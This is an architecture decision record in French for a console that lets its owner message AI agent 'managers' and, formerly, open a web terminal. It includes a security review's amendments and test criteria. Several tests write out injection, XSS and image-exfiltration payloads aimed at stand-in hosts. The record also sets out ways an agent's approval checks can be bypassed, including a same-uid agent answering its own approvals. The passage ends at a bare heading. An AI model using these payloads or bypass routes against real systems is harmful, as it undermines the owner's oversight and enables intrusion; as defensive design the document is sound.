# ADR 0008 — Messagerie avec les managers et Terminal Hermes

> **Statut au 03/11/2026 : Terminal retiré (lot 01 de l'équipe).** La Décision B et tout ce qui concerne le service terminal (tmux, `terminal.sock`) ne s'appliquent plus. La Décision A (messagerie) reste en vigueur et alimente aussi « À décider » sur l'accueil. Le service hôte `hermes-os-terminal` (fichiers `pont/hermes-os-terminal*`) est à désinstaller par Hermes sur l'hôte ; la console ne l'appelle plus.

- Chemins : `<HERMES_HOME>` = home de Hermes (`--hermes-home`, `~/.hermes` par défaut) ; `<dossier-du-pont>` = état du pont sur l'hôte (`~/.local/state/hermes-os` par défaut) ; `HERMES_OS_POLES` = `poles.yaml` facultatif.
- Statut : **validée (cto, délégation du propriétaire du 08/10)**, le 14/10/2026, après la revue secu « acceptée avec réserves » (`audits/lot-13/secu-adr.md`, carte t_9575c09a, 16 points). **En cas d'écart, la section « Amendements » en fin de document prime sur le corps.**
- Demande du propriétaire (14/10/2026) : « Dans Hermes os je veux pouvoir parler en direct avec les managers. Fait une partie messagerie qui permet ça. »
- **Correction du propriétaire (14/10/2026, prioritaire)** : « le nombre de messages est limité ; ton mot de passe est redemandé à l'ouverture de la messagerie. Non ça je ne veux pas. En revanche je veux un terminal accessible de hermes (une instance) ». → pas de limite de messages, pas de re-confirmation du mot de passe ; ajout de la décision B « Terminal ».
- Lève l'exclusion « Chat avec un agent depuis la console » du cadrage v1 (`docs/cadrage.md`) et complète l'ADR 0002 (dont la dernière ligne prévoyait de réévaluer `api_server` pour le chat).

## Contexte (vérifié le 14/10/2026 sur l'hôte de Hermes, Hermes Agent v0.21.5+4536, `hermes chat --help`)

- `hermes -p <profil> chat --query-file - --format stream-json` lit **un** message sur stdin (« nothing is shell-interpreted »), répond puis rend la main (mode requête unique, implicite hors TTY). Sortie JSONL constatée :
  - `{"type":"system","subtype":"init","model":…,"session_id":"20261014_164223_82c745"}`
  - `{"type":"tool_use","name":"read_file","input":{…}}` puis `{"type":"tool_result","name":…,"output":"…"}` (sortie **brute**, peut contenir n'importe quoi)
  - `{"type":"text","text":"…"}` (fragments de la réponse, dans l'ordre)
  - `{"type":"result","session_id":…,"exit_code":0,"text":"<réponse complète>","tokens":{…},"duration_ms":…}`
- `--resume <session_id>` reprend la session avec son contexte (vérifié : le second message a relu le cache de la première session).
- **Approbations en mode requête unique** (vérifié avec `rm -rf` sur un dossier inexistant) : la commande dangereuse est **refusée, pas exécutée** ; le `tool_result` contient `BLOCKED: Command flagged as dangerous … single-query mode (-q) runs without a user present to approve it … set approvals.single_query_mode: approve`, et l'agent continue en le disant. Aucun profil n'a `approvals.single_query_mode` aujourd'hui (grep des 6 `config.yaml` concernés). `--yolo` contournerait tout.
- Un run d'agent pèse 200 à 750 Mo de RSS (relevé `ps`). L'unit actuelle du pont plafonne à `MemoryMax=256M`, `TasksMax=64` : **insuffisant**, les runs sont des enfants du pont donc dans son cgroup.
- Les leads = profils `role: lead` du `poles.yaml` désigné par `HERMES_OS_POLES` (par exemple `lead-a`, `lead-b`). Hermes = profil `default`.

## Options

1. **`api_server` de Hermes** sur un réseau Docker interne : jeton d'accès complet à tous les outils de tous les profils depuis le conteneur, modification de la config et redémarrage du gateway. Refusé pour les raisons de l'ADR 0002.
2. **Le pont lance la CLI `hermes … chat` en liste blanche** (comme les 6 actions v1), en arrière-plan, et stocke un fil filtré que la console relit par polling. **Retenu.**
3. Relais par Discord (la console poste dans un salon, le gateway répond) : dépend de Discord, mélange les fils, ne permet ni l'arrêt ni les étapes. Refusé.

## Décision A — Messagerie : option 2

### Pont (`pont/hermes_os_pont.py`, désactivé par défaut)
- Fonction activée seulement avec l'option `--messagerie` (l'unit l'ajoute). Sans elle, les routes répondent `404` et la console affiche « Messagerie désactivée ».
- **Interlocuteurs** : calculés par le pont au démarrage et à chaque `GET /v1/messagerie` = profils `role: lead` de `poles.yaml` **qui existent** dans `profiles/` + `hermes` (→ profil `default`). Identifiant public = nom du profil (`hermes` pour default). Toute autre valeur : `422`. La console n'envoie jamais un nom de profil libre.
- **Commande** (liste d'arguments, `shell=False`, `start_new_session=True`, cwd = dossier de `HERMES_OS_POLES`, sinon `<HERMES_HOME>`) :
  `hermes -p <profil> chat --query-file - --format stream-json --source hermes-os --run-budget 900 --max-turns 90 [--resume <session_id>]`
  - texte du propriétaire sur **stdin** uniquement ; jamais dans argv ; `--yolo`, `--accept-hooks`, `--worktree`, `-t`, `-s`, `-m` **interdits** (test : argv exact).
  - `session_id` relu uniquement depuis l'événement `init` du run précédent de la même conversation, validé par `^\d{8}_\d{6}_[a-f0-9]{6}$` ; jamais fourni par la console.
  - environnement minimal (`PATH`, `HOME`, `LANG`, `HERMES_HOME`) comme les actions v1 ; dev vérifie que le run démarre ainsi (identifiants chargés par Hermes depuis son `HERMES_HOME`).
- **Garde-fou d'approbation** : avant chaque run, le pont relit `profiles/<p>/config.yaml` (ou `config.yaml` pour default) ; si `approvals.single_query_mode` vaut `approve` (ou toute valeur autre que l'absence / `deny`), il **refuse le run** (`409`, « approbations automatiques actives sur ce profil ») et `GET /v1/sante` passe en alerte.
- **Ce que le pont garde de la sortie** (lecture ligne à ligne, ligne > 1 Mio ignorée) :
  - `init` → `session_id`, `model` (stockés côté pont ; le `session_id` n'est jamais renvoyé à la console).
  - `text` → brouillon de réponse, masqué, ≤ 64 Kio.
  - `tool_use` → **une étape d'une ligne**, construite par le pont à partir du **nom** de l'outil et, pour les seuls outils de fichier (`read_file` → « lit », `write_file`/`patch` → « modifie », `search_files` → « cherche dans les fichiers »), du **nom de base** du chemin (masqué, ≤ 80 car.). Tout autre outil : « utilise : <nom> » (nom validé `^[a-z0-9_]{1,40}$`, sinon « utilise : un outil »). **Jamais** la commande terminal, une URL, une requête ni un argument.
  - `tool_result` → **jamais stocké ni renvoyé**. Seule exception : s'il commence par `BLOCKED:` ou contient `without a user present to approve`, le pont ajoute l'étape « action bloquée : à confirmer sur Discord ou au terminal » et le drapeau `approbation_requise` sur le message.
  - `result` → texte final (masqué, ≤ 64 Kio, remplace le brouillon), `exit_code`, durée, tokens totaux.
  - stderr : lu et jeté (seul un statut `echec` est consigné).
- **Arrêt** : `POST /v1/actions/messagerie.arreter {conversation}` → `SIGTERM` au groupe de processus, `SIGKILL` après 5 s ; statut `arrete`. Chien de garde du pont : `SIGTERM` à 960 s (budget 900 + marge), statut `delai_depasse`. Au démarrage du pont, tout run resté `en_cours` passe `interrompu` (un redémarrage du pont tue ses enfants : `KillMode=control-group`).
- **Garde-fous** (correction du propriétaire : **aucune limite de nombre de messages**, ni débit ni plafond global) : 1 run actif par conversation (`409`, cohérence du fil) ; texte 1 à 8 000 caractères après suppression des caractères de contrôle sauf `\n` et `\t` (`422`), 200 conversations max par interlocuteur (au-delà : `409`, « archiver »).
- **Stockage** : `<dossier-du-pont>/messagerie/` (`0700`, propriétaire = utilisateur qui fait tourner Hermes), un `<conversation>.jsonl` (`0600`) par conversation : en-tête (interlocuteur, titre, créée_a, session), puis événements numérotés (`message` valentin/manager, `etape`, `statut`). Identifiant `c_` + 16 hex (`secrets.token_hex(8)`), validé `^c_[a-f0-9]{16}$`. Le texte du propriétaire et celui du manager sont **stockés masqués**. Titre = 60 premiers caractères du premier message, masqués. Écriture par ajout + `fsync`, verrou par conversation. Rien dans `<HERMES_HOME>` n'est écrit par le pont (les sessions Hermes elles-mêmes sont écrites par Hermes).
- **Routes** (toutes signées HMAC comme la v1, rejeu refusé sur les `POST`) :
  - `GET /v1/messagerie` → `interlocuteurs[]` {id, nom, pole, modele, en_cours} + `conversations[]` {id, interlocuteur, titre, cree_a, modifie_a, statut}.
  - `GET /v1/messagerie/{conversation}?depuis=N` → {conversation, evenements[≥ N], brouillon, en_cours, etapes_en_cours} ; `N` entier ≥ 0.
  - `POST /v1/actions/messagerie.envoyer` {interlocuteur, conversation?, texte} → `202` {conversation, statut:"en_cours"} ; sans `conversation` : nouvelle conversation. Une conversation n'appartient qu'à un interlocuteur (incohérence : `422`).
  - `POST /v1/actions/messagerie.arreter` {conversation} → `200`.
  - Formes exactes ajoutées à `pont/contrat.json`.
- **Journal d'audit du pont** : `<dossier-du-pont>/messagerie/audit.jsonl` (`0600`) : horodatage, interlocuteur, conversation, longueur du texte, durée, statut, tokens. **Jamais le contenu.**
- **Unit systemd** : `MemoryMax=3G`, `TasksMax=512`, `ReadWritePaths` inchangé (unit `--user`), `ExecStart` avec `--messagerie`. Le reste du durcissement est conservé.

### Console (Laravel)
- Composant Livewire `Messagerie` (route `/messagerie`, `/messagerie/{conversation}`), lecture via `HermesClient` (pont ; `DemoClient` fournit un jeu de conversations de démonstration pour le clone neuf). **Pas de table SQLite** : le pont est la seule source (ADR 0007 inchangée).
- Accès : `auth` + `totp` (2FA de connexion) comme les autres pages. **Ni re-confirmation du mot de passe ni re-saisie TOTP** pour la messagerie (correction du propriétaire). Envoi et arrêt journalisés dans l'audit console (action, interlocuteur, longueur ; pas le contenu), sans la boîte de confirmation des actions v1.
- Interrupteur `HERMES_OS_MESSAGERIE` (défaut `true` en démo, `false` tant que le pont n'a pas `--messagerie`) : la nav n'affiche « Messagerie » que s'il est actif.
- Rendu : réponse du manager en Markdown par `App\Interface\Markdown` (`html_input: escape`, `allow_unsafe_links: false`), liens externes `rel="noopener noreferrer" target="_blank"`. Messages du propriétaire en texte brut échappé. CSP inchangée.
- Polling : `wire:poll.1s` pendant un run, `10s` sinon (ADR 0005), en ne demandant que `depuis=N`.
- « Écrire à <manager> » (fiche carte kanban, fiche manager dans Pôles) : lien GET vers `/messagerie/nouvelle?a=<id>&carte=<t_…>` qui **pré-remplit** la zone de texte (« À propos de la carte t_… (tableau) : ») ; **jamais d'envoi automatique** sur GET. `a` et `carte` validés par expression régulière.

## Risques et mitigations

| # | Risque | Mitigation |
|---|---|---|
| R1 | La messagerie = un terminal sur l'hôte de Hermes pour qui détient la session. | Compte unique + 2FA obligatoire à la connexion, sessions courtes (ADR 0003), journal d'audit, interrupteur côté pont (désactivé par défaut) et côté console. Les approbations restent celles de Hermes : rien de dangereux ne s'exécute sans le propriétaire sur Discord/terminal. **Risque accepté par le propriétaire (14/10)** : ni re-auth ni quota. |
| R2 | Injection d'arguments ou de commande via le texte. | Texte sur stdin seulement, `shell=False`, argv construit par le pont depuis une liste blanche ; test : un texte `--yolo`, `-p default`, `$(id)`, `; rm` reste du texte et l'argv est identique. |
| R3 | Choix libre de profil (ex. un profil d'exécution qui détient une clé de déploiement). | Liste blanche calculée côté pont (`role: lead` + default) ; profils non-leads refusés (`422`, testé). |
| R4 | Fuite de secrets dans les réponses ou les étapes. | Sorties d'outils jamais stockées ni renvoyées ; étapes réduites à nom d'outil + nom de fichier ; masqueur sur tout texte (stockage et réponse) ; test avec des appâts dans `tool_use.input`, `tool_result` et `text`. |
| R5 | Contournement des approbations (`--yolo`, `single_query_mode: approve`). | Drapeaux interdits (test d'argv) ; garde-fou de config avant chaque run + alerte santé. |
| R6 | Épuisement mémoire / coût (un run Opus par message). | 1 run par conversation, pas de quota (décision du propriétaire), budget 900 s, `--max-turns 90`, `MemoryMax=3G` sur l'unit ; tokens dans l'audit et visibles dans « Consommation » (source `hermes-os`). |
| R7 | Processus orphelins ou bloqués. | Groupe de processus dédié, arrêt TERM→KILL, chien de garde 960 s, statut `interrompu` au redémarrage. |
| R8 | XSS via le Markdown d'un agent (contenu influencé par une page web lue par l'agent). | `html_input: escape`, liens `javascript:` refusés, CSP stricte inchangée ; test avec `<script>`, `<img onerror>`, `[x](javascript:…)`. |
| R9 | CSRF / envoi déclenché par un lien. | Envoi uniquement par action Livewire POST ; « Écrire à » ne fait que pré-remplir. |
| R10 | Lecture de conversations par traversée de chemin. | ID `^c_[a-f0-9]{16}$`, `realpath` confiné à `<dossier-du-pont>/messagerie`, liens symboliques refusés. |

## Décision B — Terminal Hermes (ajout du 14/10) — REMPLACÉE : terminal retiré (03/11/2026)

Une page **« Terminal »** : vrai terminal web sur **une seule instance persistante** du TUI `hermes` (profil principal), comme en SSH.

### Hôte : service `hermes-os-terminal` (distinct du pont)
- Nouveau service séparé du pont (`pont/hermes_os_terminal.py`, Python 3 stdlib, unit `systemd --user` `hermes-os-terminal.service`, `MemoryMax=4G`, `TasksMax=512`) : un défaut du terminal ne touche pas les lectures, et inversement.
- **Instance unique** : serveur tmux dédié (`tmux -L hermes-os`, socket tmux privé), session `hermes-os`, créée si absente, qui exécute **`hermes` seul** (pas de shell de connexion), utilisateur qui fait tourner Hermes, `HERMES_HOME` normal, cwd `<HERMES_HOME>`. Si `hermes` se termine, le panneau affiche « [Entrée] pour relancer » puis relance `hermes` (petit script de boucle `pont/hermes-os-terminal-boucle` qui n'interprète aucune autre saisie). Fermer l'onglet ne tue rien ; rouvrir = se rattacher.
- **Transport** : WebSocket (RFC 6455, stdlib ; données binaires = flux du pty ; messages texte JSON de contrôle `{"type":"redim","cols":…,"lignes":…}`), servi **uniquement sur le socket Unix** `<dossier-du-pont>/run/terminal.sock` (`0660`). **Aucun port TCP**, aucune option pour en ouvrir un. Chaque connexion ouvre un pty qui lance `tmux -L hermes-os attach -d -t hermes-os` : `-d` détache les autres clients → **une seule connexion pilote** ; l'ancienne reçoit « session reprise ailleurs » puis est fermée.
- **Jeton par connexion** : le service n'accepte l'upgrade qu'avec un en-tête `X-Terminal-Jeton` = `horodatage.hex(HMAC-SHA256(secret, "terminal\n" + horodatage))` (secret du pont, fenêtre ±30 s, usage unique). Défense en profondeur : un bug de routage dans la console ne suffit pas à ouvrir le terminal.
- **Journal** : `<dossier-du-pont>/terminal/audit.jsonl` (`0600`) : connexion, déconnexion, reprise ailleurs, relance de `hermes`, horodatage, durée. **Jamais le contenu** (frappes ou écran).
- `tmux` : paquet Debian 3.5a (dépôt officiel, non installé aujourd'hui, vérifié `apt-cache policy`), installé par Hermes. `ttyd` écarté : absent des dépôts Debian de l'hôte, binaire tiers à maintenir.

### Chemin du WebSocket : `forward_auth` dans le Caddy de la console (arbitrage cto)
- Le propriétaire proposait Traefik forwardAuth. **Même principe, mais dans le Caddy (FrankenPHP) du conteneur console** : Traefik (conteneur de l'outil de déploiement) ne voit pas le socket Unix ; il faudrait le monter dans Traefik et poser des labels hors dépôt. Le conteneur console monte déjà `<dossier-du-pont>/run` → `/run/hermes-os` ; la règle est versionnée dans `docker/frankenphp/Caddyfile`, testée au clone neuf ; Traefik reste inchangé (il relaie déjà les WebSocket).
- Route `/terminal/ws` : Caddy supprime tout `X-Terminal-Jeton` entrant, appelle `forward_auth` vers `GET /terminal/autoriser` (Laravel) avec cookie et `Origin` ; Laravel répond **204 + `X-Terminal-Jeton`** seulement si : session authentifiée, 2FA validée (même règle que le middleware `totp`), `Origin` exactement égal à `APP_URL` (anti Cross-Site WebSocket Hijacking), `Upgrade: websocket`. Sinon **401** (non connecté / 2FA non faite) ou **403** (origine). Caddy copie le jeton puis `reverse_proxy unix//run/hermes-os/terminal.sock`.
- Cookies : session Laravel existante (`Secure`, `HttpOnly`, `SameSite=Strict` (valeur actuelle de `config/session.php`)) ; aucun jeton dans l'URL.

### Console
- Page `/terminal` plein écran : **`@xterm/xterm` 6.0.0** + **`@xterm/addon-fit` 0.11.0** (versions npm vérifiées le 14/10/2026 ; dev revérifie le jour du code et ajoute `@xterm/addon-web-links` compatible), **bundlés par Vite**, aucun CDN. CSP inchangée sauf `connect-src` qui autorise le WebSocket même origine (`wss://` de l'hôte). 256 couleurs / truecolor, redimensionnement, copier/coller, liens cliquables (`noopener noreferrer`).
- Barre flottante en verre dosé : « Terminal » en anglaise, état connecté / déconnecté / repris ailleurs, bouton Reconnecter. Zone terminal opaque, fond nuit, palette ANSI accordée à la DA N3, police mono lisible (seule exception mono admise du DS, à documenter). Mobile : rangée Échap, Tab, Ctrl, ← ↑ ↓ → au-dessus du clavier natif.
- Nav : « Terminal » après « Messagerie ». Interrupteur `HERMES_OS_TERMINAL`. En démo (clone neuf) : terminal factice local qui affiche une bannière d'exemple, aucun shell, aucun WebSocket réel.

### Risques propres au terminal
| # | Risque | Mitigation |
|---|---|---|
| T1 | Shell non authentifié sur le serveur. | Socket Unix seulement ; `forward_auth` testé (sans cookie → 401, sans 2FA → 401, mauvaise origine → 403) ; jeton HMAC à usage unique vérifié par le service (forgé/rejoué/expiré → refus, testé) ; en-tête client supprimé. |
| T2 | Cross-Site WebSocket Hijacking. | `Origin` strict côté Laravel, `SameSite=Strict` (valeur actuelle de `config/session.php`). |
| T3 | Le TUI Hermes a son propre outil terminal : c'est l'équivalent d'un SSH. | Voulu par le propriétaire ; les approbations **interactives** de Hermes s'appliquent (le propriétaire est devant l'écran). **Risque accepté par le propriétaire (14/10).** |
| T4 | Fuite par le journal. | Journal sans contenu (test). |
| T5 | Exposition réseau accidentelle. | Aucune option TCP (test) ; `ss -ltnp` sans nouveau port après installation (vérifié par Hermes). |

## Conséquences
- Le pont passe d'« exécute 6 commandes courtes » à « lance des agents » : c'est le composant le plus sensible d'hermes-os ; toute modification de la messagerie demande une revue secu.
- Les réponses des managers peuvent agir sur le serveur dans les limites de leur profil, comme sur Discord ; ce n'est pas un mode lecture seule.
- À la livraison, Hermes réinstalle le pont (`--messagerie`), installe `tmux` et le service `hermes-os-terminal`.

## Amendements (revue secu du 14/10/2026, arbitrage cto)

Cette section prime sur tout le corps de l'ADR. Chaque point S… de `audits/lot-13/secu-adr.md` est **intégré**, sauf mention « reporté » avec sa raison. Les tests cités servent de critères d'acceptation à l'audit du code (secu, carte t_18da5a9e).

### Bloquants (intégrés avant tout code)

**S1 — Chaîne `forward_auth`.** Remplace le paragraphe « Route `/terminal/ws` » de la décision B.
- Un listener d'autorisation **distinct, en boucle, non publié**, `127.0.0.1:8081`, est déclaré dans `docker/frankenphp/Caddyfile`. Il ne sert que `/terminal/autoriser` et la route d'état de session de S6 ; tout le reste répond 404.
- Sur le site public `:8080`, `/terminal/autoriser` répond **404**. `/terminal/ws` est traité dans un bloc **`route`** explicite, qui garantit l'ordre du fichier :
  1. `request_header -X-Terminal-Jeton` ;
  2. **puis** `forward_auth 127.0.0.1:8081 { uri /terminal/autoriser ; copy_headers X-Terminal-Jeton }` ;
  3. **puis** `reverse_proxy unix//run/hermes-os/terminal.sock`.

  Le principe est imposé ; dev valide la syntaxe sur la version de Caddy embarquée.
- Un 204 sans `X-Terminal-Jeton` n'ouvre rien : le service refuse l'upgrade sans jeton, et un test de bout en bout le vérifie.
- Côté Laravel (`/terminal/autoriser`) :
  - **401** sans session ou sans 2FA. Le contrôle 2FA **réutilise la classe du middleware `totp`**, sans ré-implémentation.
  - **403** dans chacun de ces cas :
    - `Origin` **absent**, ou différent de `APP_URL` (schéma + hôte + port ; jamais comparé à `Host`) ;
    - `X-Forwarded-Uri` ≠ `/terminal/ws` ;
    - `Sec-Fetch-Site` présent et ≠ `same-origin` ;
    - `Upgrade` ≠ `websocket`.
- Tests : curl contre le conteneur du clone neuf, avec la trace dans le rapport dev.
  - (a) Sans cookie → 401.
  - (b) Cookie sans 2FA → 401.
  - (c) `Origin: https://evil.example` → 403.
  - (d) Sans `Origin` → 403.
  - (e) `X-Terminal-Jeton` forgé par le client → le service reçoit celui de Laravel (à vérifier dans le journal).
  - (f) `GET /terminal/autoriser` sur `:8080` → 404.
  - (g) `ss -ltnp` dans le conteneur → 8081 en loopback seulement.

**S2 — Garde-fou d'approbation complet.** Remplace le paragraphe « Garde-fou d'approbation » de la décision A et la ligne « environnement minimal ».
- Avant chaque run, le pont lit trois clés dans le `config.yaml` du profil : `approvals.mode`, `approvals.single_query_mode` et `hooks_auto_accept`.
- Le run n'est accepté **que si** les trois conditions sont réunies :
  - `mode` ∈ {absent, `manual`, `smart`} ;
  - `single_query_mode` ∈ {absent, `deny`} ;
  - `hooks_auto_accept` ∈ {absent, `false`}.

  Sinon : `409` « approbations automatiques actives sur ce profil ».
- **Échec fermé** : un fichier illisible, un YAML non analysable ou une valeur inconnue donnent `409` et une alerte dans `GET /v1/sante`.
- Le mode `smart` est le défaut actuel de Hermes : un LLM auxiliaire peut y auto-approuver une commande jugée à faible risque. C'est un comportement connu de Hermes, identique sur Discord, et accepté.
- Environnement du fils : **`env=` explicite en liste blanche** (`PATH`, `HOME`, `LANG`, `HERMES_HOME`, `NO_COLOR`), jamais une copie de `os.environ`. En particulier, jamais `HERMES_YOLO_MODE`, `HERMES_ACCEPT_HOOKS` ni `HERMES_OS_PONT_*`.
- À l'installation (Hermes, carte de livraison), la commande `grep -cE '^(HERMES_YOLO_MODE|HERMES_ACCEPT_HOOKS)=' <HERMES_HOME>/.env <HERMES_HOME>/profiles/*/.env` doit compter 0 partout. Elle ne fait que compter et n'affiche aucune valeur.
- Tests :
  - `mode: off` → 409 ;
  - `single_query_mode: approve` → 409 ;
  - YAML tronqué → 409 ;
  - `hooks_auto_accept: true` → 409 ;
  - `smart`, `manual` ou absent → acceptés ;
  - `HERMES_YOLO_MODE=1` et `HERMES_ACCEPT_HOOKS=1` posés dans l'environnement du pont de test → absents de l'`env` du fils.

### Majeurs (exigences du lot dev)

**S3 — Pas d'échappement par tmux.**
- Un fichier versionné `pont/hermes-os-terminal.tmux.conf` est passé par `-f`, avec : `unbind-key -a`, `prefix None`, `prefix2 None`, `status off`, `default-shell /bin/false`, `mouse off`, `set-clipboard off`, `allow-passthrough off`, `remain-on-exit off`.
- La syntaxe est à valider sur tmux 3.5a. Si une option n'existe pas, dev le signale ; l'intention reste imposée.
- La session est créée par `new-session -d -s hermes-os '<boucle>'`.
- La boucle `pont/hermes-os-terminal-boucle` est écrite en `sh` :
  - elle lance `hermes` ;
  - à sa sortie, elle affiche « [Entrée] pour relancer » ;
  - elle attend par un `read` borné, sous `trap '' INT TSTP QUIT` ;
  - elle n'interprète aucune autre saisie.
- Tests (faux tmux ou tmux de test) : `list-keys` vide ; envoi de `C-b :` puis `new-window` → aucune fenêtre créée.

**S4 — Pilotage du TUI par un agent du même uid.** Point intégré comme réduction de risque :
- Socket tmux privé `-S <dossier-du-pont>/terminal/tmux.sock` (dossier `0700`) au lieu de `-L hermes-os`. **Toutes les commandes tmux de l'ADR utilisent `-S <ce chemin>`.**
- Hermes ajoute à l'installation des globs `approvals.deny` (`*tmux*hermes-os*`, `*terminal.sock*`, `*hermes-os-terminal*`) dans le `config.yaml` de `default` et des 5 leads. C'est une réduction, contournable via `python -c`.
- **Risque résiduel ajouté à R1 et T3** : « un agent du même uid peut piloter l'instance du terminal, y compris pour répondre à une approbation ».
  - Ce risque est **distinct de celui accepté le 14/10** (« terminal = équivalent SSH »).
  - Il ne change pas le périmètre fonctionnel du lot.
  - Il est **soumis au propriétaire pour acceptation explicite avant l'installation du service terminal** (carte de livraison Hermes). Sans acceptation, le service terminal n'est pas installé ; la messagerie peut l'être.
- Piste v2 : un uid dédié au terminal.
- Test, à l'installation et sur la vraie config : un run d'un profil non-lead qui exécute `tmux -S <dossier-du-pont>/terminal/tmux.sock list-sessions` reçoit `BLOCKED`.

**S5 — Jeton du terminal.** Remplace le paragraphe « Jeton par connexion ».
- Format : `horodatage.nonce.hmac`.
  - `nonce` : 16 octets aléatoires, en hex.
  - `hmac` : HMAC-SHA256 de `"terminal\n"+horodatage+"\n"+nonce`.
- Clé : **secret distinct** de celui du pont, `~/.config/hermes-os-pont/terminal-secret` (`0600`, ≥ 32 octets, mêmes contrôles que `lire_secret`).
- Contrôles du service :
  - fenêtre de ±30 s ;
  - nonces mémorisés 60 s ; un rejeu donne 401, journalisé « jeton rejoué » ;
  - comparaison par `hmac.compare_digest` ;
  - format vérifié par `re.fullmatch(r"\d{9,11}\.[a-f0-9]{32}\.[a-f0-9]{64}")`.
- Tests :
  - rejeu → 401 ;
  - +31 s → 401 ;
  - jeton forgé → 401 ;
  - deux jetons émis dans la même seconde → chacun valide une fois.

**S6 — Durée de vie de la connexion.** Aucune re-saisie de mot de passe : la décision du propriétaire est respectée.
- Le service ferme la connexion (code 1008) après 12 h.
- La page appelle `/terminal/ping` (auth + totp) toutes les 5 min, pour garder la session vivante tant que l'onglet est ouvert.
- Une déconnexion ou une révocation de la session ferme le WebSocket en ≤ 60 s.
- **Choix cto pour cette fermeture** :
  - le jeton porte un hash de l'identifiant de session ;
  - toutes les 30 s, le service interroge une route d'état de session servie par le listener interne `127.0.0.1:8081` (même principe que S1) ;
  - cette route répond 204 si la session est valide, 401 sinon.
- Tests : session supprimée → fermeture en ≤ 60 s ; 12 h simulées (horloge injectée) → fermeture.

**S7 — Masqueur.**
- Motifs ajoutés :
  - mot de passe d'application Nextcloud : `\b[A-Za-z0-9]{5}(?:-[A-Za-z0-9]{5}){4}\b` ;
  - mot de passe d'application Gmail (4 groupes de 4 minuscules séparés par des espaces), seulement en contexte « mot de passe / mdp / app » à ≤ 40 caractères ;
  - masque d'entropie : toute chaîne `[A-Za-z0-9_\-+/=]{32,}` qui mêle majuscule, minuscule et chiffre. Exceptions : `t_[a-f0-9]+`, `c_[a-f0-9]{16}`, identifiant de session Hermes, hash git.
- Étapes : si le nom de base figure dans `NOMS_INTERDITS` ou commence par `.env`, ou si le chemin contient `/.config/` ou `/vault/`, l'étape devient « lit un fichier protégé », sans nom.
- Tests : appâts de chaque format dans `text`, `tool_use.input` et `tool_result` → absents de la réponse **et** du JSONL (`grep`).

**S8 — Liste blanche indépendante de `poles.yaml`.**
- L'unit porte une liste fermée : `--interlocuteurs hermes,<lead-a>,<lead-b>…` (les leads de l'équipe).
- Interlocuteurs effectifs = cette liste ∩ profils `role: lead` de `poles.yaml` (+ `hermes`) ∩ profils existants.
- Ajouter un manager = modifier l'unit (fait par Hermes).
- Tests : un `poles.yaml` de test qui met un profil hors liste en `lead` → `422` à l'envoi, et le profil reste absent de `GET /v1/messagerie`.

**S9 — Épuisement.** Ce n'est **pas** une limite de messages (la décision du propriétaire est respectée) mais un plafond de simultanéité, invisible à l'usage normal.
- **4 runs simultanés** au maximum pour tout le pont. Au-delà : `409` « 4 réponses déjà en cours », sans file cachée.
- Lecture bornée par `readline(1048577)`. En cas de dépassement, le pont draine par blocs de 64 Kio jusqu'au `\n`, sans rien garder.
- `stderr=subprocess.DEVNULL`.
- `OOMPolicy=continue` dans l'unit.
- JSONL ≤ 5 Mio par conversation ; au-delà : `409` « conversation pleine, en ouvrir une nouvelle ».
- Dossier `messagerie/` ≤ 500 Mio, avec alerte santé.
- Tests :
  - 5ᵉ envoi simultané → 409 ;
  - ligne de 50 Mio → RSS du pont en hausse de moins de 100 Mo ;
  - 10 Mio sur stderr → aucun blocage.

**S10 — Bornes du WebSocket stdlib.**
- Trames :
  - toute trame client non masquée est refusée ;
  - charge utile et message réassemblé ≤ 64 Kio, sinon fermeture 1009 ;
  - trames de contrôle ≤ 125 octets, non fragmentées ;
  - type non géré → fermeture 1003.
- Messages de contrôle : seul `{"type":"redim","cols":int,"lignes":int}` est accepté, avec `20 ≤ cols ≤ 500` et `5 ≤ lignes ≤ 200` ; tout le reste est ignoré. `TIOCSWINSZ` est appelé avec des entiers.
- Connexion :
  - ping/pong toutes les 30 s, fermeture après 2 pongs manqués ;
  - une seule connexion active : la reprise ferme l'ancienne **avant** l'attache.
- Tests (fuzz minimal) : trame non masquée, longueur 2^63, 1 000 fragments, `{"cols":"1;rm"}`. Attendu dans chaque cas : connexion fermée, service vivant, `pgrep -c` inchangé.

### Mineurs (exigences à cocher, non bloquantes pour le démarrage)

**S11 — Expressions régulières d'identifiants.**
- `re.fullmatch` pour `conversation`, `session_id`, `a` et `carte`.
- `--resume=<id>` passé en un seul argument.
- Tests : `c_…\n`, `20261014_165608_84e15c\n` et toute valeur commençant par `-` → 422.

**S12 — CSP du terminal.**
- Sur `/terminal` seulement : `connect-src 'self' wss://<hôte de APP_URL>`, jamais `wss:` ni `*`.
- **`unsafe-inline` et `unsafe-eval` sont interdits.** Si xterm injecte un style, on lui passe le nonce.
- `@xterm/addon-web-links` avec un gestionnaire explicite : schémas `https?:` seulement, `noopener,noreferrer`.
- Aucun addon presse-papiers (OSC 52), et le flux ne peut pas modifier le titre de la page.
- `img-src 'self' data:` n'est jamais relâché : c'est ce qui coupe l'exfiltration par image Markdown.
- Tests :
  - la CSP de `/terminal` contient exactement l'hôte ;
  - aucune violation CSP en console ;
  - un lien `javascript:` ou `file:` affiché n'est pas cliquable ;
  - `![](https://evil/?d=x)` n'est pas chargé.

**S13 — Unit du terminal.**
- Environnement : `UnsetEnvironment=HERMES_YOLO_MODE HERMES_ACCEPT_HOOKS`, `Environment=TERM=xterm-256color LANG=C.UTF-8`, aucune variable `HERMES_OS_PONT_*` ni secret du pont.
- `KillMode=process`, avec tmux lancé par `systemd-run --user --scope -p MemoryMax=4G -p TasksMax=512`.
- Durcissements repris de l'unit du pont : `NoNewPrivileges`, `LockPersonality`, `RestrictRealtime`.
- À noter au README : ces durcissements s'appliquent aussi aux runs (par exemple, `sudo` est impossible depuis la console), pour éviter un faux bug.
- Test : un redémarrage du service conserve la session tmux.

**S14 — Journalisation.**
- (1) Les refus sont audités : 401/403 de `/terminal/autoriser` et jetons refusés par le service, avec horodatage et motif, sans cookie ni contenu.
- (2) Notification au propriétaire à chaque ouverture du terminal : **reportée en v2.**
  - Raison : il faudrait donner au service terminal un canal sortant (Discord) qu'il n'a pas, et le propriétaire veut zéro friction.
  - Compensation dans ce lot : les ouvertures et les « reprises ailleurs » apparaissent dans le journal d'audit existant de la console, sans nouveau composant.
- (3) `audit.jsonl` ne contient que des champs numériques ou énumérés.
  - Test : un texte de 200 caractères apparaît 0 fois dans les deux `audit.jsonl` et dans `journalctl --user -u hermes-os-pont`.
- (4) Un agent du même uid peut altérer les journaux (cf. S4) : noté, non traité ici.

**S15 — Arrêt et orphelins.**
